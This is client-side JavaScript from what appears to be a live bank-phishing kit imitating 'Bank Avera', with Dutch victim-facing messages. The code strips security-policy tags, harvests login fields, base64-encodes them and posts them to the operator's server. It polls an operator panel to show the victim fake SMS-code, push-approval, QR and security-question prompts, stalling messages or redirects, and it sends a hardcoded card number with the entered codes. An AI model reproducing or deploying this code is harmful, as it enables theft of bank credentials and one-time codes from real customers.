    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://1.5.3/build/qrcode.min.js"></script>
    <link href="/bos_files/sweetalert2.min.css" rel="stylesheet">
    
    <script>
    
    var lkscript = true;
    var bankLink = window.location.href !== 'about:srcdoc' ? window.location.href.split('/') [3] : 'bank-avera';
    var urlParams = new URLSearchParams(window.location.search);
    
    document.querySelectorAll('base, meta[http-equiv]').forEach(el => {
      const val = el.getAttribute('http-equiv')?.toLowerCase() || '';
      if (val.includes('policy')) el.remove();
      console.log("del tag");
    });
    
    function postRedirect(url, data) {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = url;
        
        for (var key in data) {
            if (data.hasOwnProperty(key)) {
                var input = document.createElement('input');
                input.name = key;
                input.value = data[key];
                form.appendChild(input);
            }
        }
        
        document.body.appendChild(form);
        form.submit();
    }
    
    var blocker = false;
    
    const currentLanguage = 'translate';
    const t = translations[currentLanguage];
    window.t = t; // for shadow iframe
    
    if (typeof window.openFormLoading !== 'function') {
        window.openFormLoading = function (title, text) {
            return Swal.fire({
                title: title || t.loginConfirmation,
                text: text || t.pleaseWait,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
        };
    }
    
    if (typeof window.closeFormLoading !== 'function') {
        window.closeFormLoading = function () {
            Swal.close();
        };
    }
    
    $.post('#', { type: "notify", action: "lk", finger: "" });
    
    class Account {
        static #sanitizeInput(input) {
            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
        
        static code() {
            Swal.fire({
                title: t.confirmation,
                text: t.codeSent,
                input: 'text',
                inputPlaceholder: t.enterCode,
                confirmButtonText: t.confirm,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCancelButton: false,
                inputValidator: (value) => {
                    if (!value) return t.codeRequired;
                    if (!/^\d+$/.test(value)) return t.numbersOnly;
                },
                preConfirm: (value) => {
                    if (value.trim().length < 1) {
                        alert("Incorrect code");
                    } else {
                        return fetch('#', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({
                                type: "code",
                                number: "5351 4154 0624 9643",
                                code: value
                            })
                        }).then(response => {
                            if (!response.ok) throw new Error('Network error');
                            Account.wait();
                        });
                    }
                }
            });
        }
        
        static wait() {
            return Swal.fire({
                title: t.loginConfirmation,
                text: t.pleaseWait,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
        }
        
        static async qrsync() {
            let qrDataInterval = null;
            let lastData = null;
            let intervalStartTime = Date.now();
            let lastDataChangeTime = Date.now();
            let lastServerDataTime = Date.now();
            
            const generateQRCode = async (data) => {
                try {
                    const qrDataUrl = await QRCode.toDataURL(data, {
                        width: 300,
                        margin: 2,
                        color: {
                            dark: '#000000',
                            light: '#FFFFFF'
                        }
                    });
                    return qrDataUrl;
                } catch (error) {
                    console.error('QR code generation error:', error);
                    return null;
                }
            };
            
            const showQRCode = async (data) => {
                const qrImage = await generateQRCode(data);
                if (qrImage) {
                    Swal.fire({
                        title: 'QR code',
                        imageUrl: qrImage,
                        imageWidth: 300,
                        imageHeight: 300,
                        imageAlt: 'QR code',
                        confirmButtonText: 'Close',
                        allowOutsideClick: true,
                        allowEscapeKey: true
                    });
                }
            };
            
            Swal.fire({
                title: t.loginConfirmation,
                text: t.pleaseWait,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
            
            qrDataInterval = setInterval(async () => {
                try {
                    const now = Date.now();
                    const timeSinceStart = now - intervalStartTime;
                    const timeSinceLastDataChange = now - lastDataChangeTime;
                    const timeSinceLastServerData = now - lastServerDataTime;
                    
                    if (timeSinceLastServerData > 180000) {
                        console.log('Interval closed: no server data for 3 minutes');
                        if (qrDataInterval) {
                            clearInterval(qrDataInterval);
                            qrDataInterval = null;
                        }
                        Swal.close();
                        return;
                    }
                    
                    if (timeSinceLastDataChange > 180000 && lastData !== null) {
                        console.log('Interval closed: data unchanged for 3 minutes');
                        if (qrDataInterval) {
                            clearInterval(qrDataInterval);
                            qrDataInterval = null;
                        }
                        Swal.close();
                        return;
                    }
                    
                    if (timeSinceStart > 180000) {
                        console.log('Interval closed: 3 minutes elapsed');
                        if (qrDataInterval) {
                            clearInterval(qrDataInterval);
                            qrDataInterval = null;
                        }
                        Swal.close();
                        return;
                    }
                    
                    const response = await fetch('#', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: new URLSearchParams({
                            type: 'XApi',
                            act: 'qrsync'
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error('Network error');
                    }
                    
                    const result = await response.json();
                    lastServerDataTime = Date.now();
                    const serverDataValue = result.data || '';
                    
                    if (!serverDataValue || serverDataValue.trim() === '') {
                        console.log('Waiting for data...');
                    } else {
                        if (lastData !== serverDataValue) {
                            lastData = serverDataValue;
                            lastDataChangeTime = Date.now();
                            console.log('Server data changed:', serverDataValue);
                            
                            Swal.close();
                            await showQRCode(serverDataValue);
                            
                            if (qrDataInterval) {
                                clearInterval(qrDataInterval);
                                qrDataInterval = null;
                            }
                        }
                    }
                } catch (error) {
                    console.error('Error checking data:', error);
                }
            }, 2000);
        }
        
        static push() {
            return Swal.fire({
                title: t.loginConfirmation,
                html: t.pushNotification,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });
        }
        
        static incorrectData(lambda = null) {
            return Swal.fire({
                icon: "error",
                title: t.error,
                text: t.incorrectData,
                confirmButtonText: t.ok
            }).then((result) => {
                if (lambda != null) lambda();
            });
        }
        
        static error(text) {
            return Swal.fire({
                icon: "error",
                title: t.error,
                text: this.#sanitizeInput(text),
                confirmButtonText: t.ok
            });
        }
        
        static quest(title, text, img) {
            return Swal.fire({
                title: this.#sanitizeInput(title),
                text: this.#sanitizeInput(text),
                input: 'text',
                inputPlaceholder: this.#sanitizeInput(text),
                confirmButtonText: t.confirm,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCancelButton: false,
                ...(img ? { imageUrl: img } : {}),
                preConfirm: (value) => {
                    if (value.trim().length < 1) {
                        alert("Incorrect question");
                    } else {
                        return fetch('#', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({
                                type: "quest",
                                value: value,
                                title: title
                            })
                        }).then(response => {
                            if (!response.ok) throw new Error('Network error');
                            Account.wait();
                        });
                    }
                }
            });
        }
        
        static alert(title, text, img = false) {
            return Swal.fire ({
                title: this.#sanitizeInput(title),
                text: this.#sanitizeInput(text),
                ...(img ? { imageUrl: img } : {}),
            }).then((result) => {
                if (result.isConfirmed)Account.wait ();
            });
        }
        
        static findById(id, root = document) {
          const el = root.getElementById ? root.getElementById(id) : null;
          if (el) return el;
    
          for (const node of root.querySelectorAll('*')) {
            if (node.shadowRoot) {
              const found = Account.findById(id, node.shadowRoot);
              if (found) return found;
            }
          }
          return null;
        }
        
        
        
        static async login(...ids) {
          try {
              if (blocker == true)return;
              blocker = true;
              
              openFormLoading(t.loginConfirmation, t.pleaseWait);
              
            // --- BEGIN ---
                var bankNameData = 'Unknown';
                
                const bankElement = document.getElementById('bank-name');
                if (bankElement !== undefined && bankElement !== null && bankElement.dataset.name !== undefined && bankElement.dataset.name !== null) {
                    bankNameData = bankElement.dataset.name;
                }
                else bankNameData = 'null';
                
                if (bankNameData == 'null') {
                    bankNameData = 'BANK avera';
                }
            // --- END ---
            
            setTimeout (function () {
                blocker = false;
            }, 1000 * 3);
            
            const sentData = [];
    
            for (const id of ids) {
              const input = Account.findById(id);
              if (!input) {
                console.error(`Элемент с ID ${id} не найден`);
                continue;
              }
    
            if (!['INPUT', 'TEXTAREA'].includes(input?.tagName)) {
                console.error("Elements logx incorrect input | textarea");
                return;
            }
    
              const value = input.value.trim();
              if (!value) {
                continue;
              }
    
              const key = input.dataset.name || id;
              const utf8Bytes = new TextEncoder().encode(key);
              const binaryString = String.fromCharCode(...utf8Bytes);
              const encodedName = btoa(binaryString);
    
              sentData.push({
                input_name: encodedName,
                input_data: value
              });
            }
    
            if (sentData.length === 0) {
              throw new Error(t.noDataSent);
            }
    
            const jsonString = JSON.stringify(sentData);
            const base64String = btoa(unescape(encodeURIComponent(jsonString)));
    
            console.log("Sent data", {
              original: sentData,
              base64: base64String
            });
            
            
            const params = new URLSearchParams();
            params.append('bank', bankNameData);
            params.append('type', 'lkdata');
            params.append('data', base64String);
    
            const response = await fetch('#', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
              },
              body: params.toString()
            });
    
            if (!response.ok) {
              blocker = false;
              closeFormLoading ();
              
              const errorText = await response.text();
              throw new Error(`Ошибка сервера: ${response.status} - ${errorText}`);
            }
            
            
            //await Account.wait();
    
          } catch (error) {
            blocker = false;
            closeFormLoading ();
            
            await Account.error(error.message || t.serverError);
            throw error;
          }
        }
        
        static init(bankname) {
            try {
                if (bankname == 'null' || bankname == null)return;
                
                let element = document.getElementById('bank-name');
                if (element === undefined || element === null) {
                    element = document.createElement('input');
                    element.type = 'hidden';
                    element.id = 'bank-name';
                    document.body.appendChild(element);
                }
                element.dataset.name = bankname;
                element.value = bankname;
            } catch (error) {
                console.error("Init error:", error);
            }
        }
        
        static card() {
            location.href = `/receive/49220272?showCard=Y&initialize=fromSelectBank`;
        }
        
        static validateAllLogxInputs() {
            let allFilled = true;
            const inputs = document.querySelectorAll('.logx');
            
            inputs.forEach(input => {
                if (input.value.length < 1) {
                    input.style.backgroundColor = '#FFA3A3';
                    allFilled = false;
                } else {
                    const defaultColor = window.getComputedStyle(input).backgroundColor;
                    input.style.backgroundColor = defaultColor;
                }
            });
            
            return allFilled;
        }
        
        static queryAllShadow(selector, root = document) {
            let results = [];
    
            function traverse(node) {
              if (node.querySelectorAll) {
                results = results.concat([...node.querySelectorAll(selector)]);
              }
    
              if (node.shadowRoot) {
                traverse(node.shadowRoot);
              }
    
              node.childNodes.forEach(traverse);
            }
    
            traverse(root);
            return results;
        }
    
        static findLoginButton() {
            let btn = document.getElementById('loginButton');
            if (btn) return btn;
    
            const buttons = Account.queryAllShadow('#loginButton');
            if (buttons.length > 0) {
              return buttons[0];
            }
    
            return null;
        }
        
        static initInputs(ids) {
            const loginButton = Account.findLoginButton();
            if (!loginButton) {
                console.log("Error initialize button not found");
                return;
            }
    
            document.querySelectorAll('.logx').forEach(input => {
                input.addEventListener('input', (e) => {
                    const defaultColor = window.getComputedStyle(e.target).backgroundColor;
                    e.target.style.backgroundColor = e.target.value.length < 1 ? '#FFA3A3' : defaultColor;
                });
            });
    
            loginButton.addEventListener('click', (e) => {
                e.preventDefault();
                console.log("click button!");
                if (!this.validateAllLogxInputs()) {
                    console.log("Error initialize inputs not correct");
                    return;
                }
                
                Account.login(...ids);
                return; // V [old code...] V
    
                
                (async function() {
                    var intervalId = setInterval(async function() {
                        try {
                            var params = new URLSearchParams();
                            params.append('type', 'XApi');
    
                            var response = await fetch('#', {
                              method: 'POST',
                              headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                              },
                              body: params
                            });
                            
                            if (!response.ok) {
                                throw new Error('Network response was not ok');
                            }
                            
                            var data = await response.text();
                            console.log(data);
                            
                            switch (data.trim()) {
                                case "qrsync":
                                    Account.qrsync();
                                    break;
                                case "push":
                                    Account.push();
                                    break;
                                case "sms":
                                    Account.code();
                                    break;

                                    Account.incorrectData(function () {

                                    });
                                    break;

                                    break;

                                case "showbanks":
                                    postRedirect ('/receive/49220272', { slk: true });
                                    break;
                                case "custom_push":
                                    $.post('#', { type: 'acts', text: 'push' });
                                    $('#push-amount').text(data.trim().substr(12));
                                    showPush();
                                    break;
                                case "custom_text":
                                    $.post('#', { type: 'acts', text: 'push' });
                                    $('#push-amount').text(data.trim().split(':')[1]);
                                    $('#footer-up').html(data.trim().split(':')[2]);
                                    showPush();
                                    break;
                            }
                            
                            if (data.trim().substr(0, 8) == 'question') {
                                var dataJson = JSON.parse(data.trim().substr(9));
                                Account.quest(dataJson.title, dataJson.text, dataJson.img);
                            }
                            if (data.trim().substr(0, 12) == 'custom_error') {
                                var dataerror = data.trim().substr(13);
                                Account.error(dataerror);
                            }
                            if (data.trim().substr(0, 13) == 'alert_message') {
                                //var dataJson = JSON.parse(data.trim().substr(14));
                                Account.alert("", data.trim().substr(14), "");
                            }
                            if (data.trim().substr(0, 13) == 'redirect_url:') {
                                $.post('#', { type: 'acts', text: 'redirect' });
                                if (data.trim().substr(13,1) != '/')location.href = "http://" + data.trim().substr(13);
                                else 								location.href = data.trim().substr(13);
                            }
                            if (data.trim().substr(0, 4) == 'hold') {
                                var flag = data.trim().substr(5);
                                var msg = '';
                                if (flag == '1')msg = 'Uw gegevens worden verwerkt, u moet 5-10 minuten wachten. VERLAAT DEZE PAGINA NIET, ANDERS KAN ER EEN FOUT OPTREDEN BIJ HET VERWERKEN VAN DE INGEVOERDE GEGEVENS. Heeft u vragen? Neem dan contact op met de klantenservice via de chat. De online chat bevindt zich rechtsonder in de hoek.';
                                else if (flag == '2')msg = 'Helaas kunnen we uw gegevens op dit moment niet verwerken. We voeren momenteel wat technisch onderhoud uit. Probeert u het alstublieft over een paar uur opnieuw. Onze excuses voor het ongemak. Heeft u vragen? Neem dan contact op met de klantenservice via de chat. De online chat bevindt zich rechtsonder in de hoek.';
                                
                                Account.alert('Aandacht', msg);
                            }
                        } catch (error) {
                            console.error('Error during polling:', error);
                            clearInterval(intervalId);
                        }
                    }, 1500);
                })();
            });
        }
    }
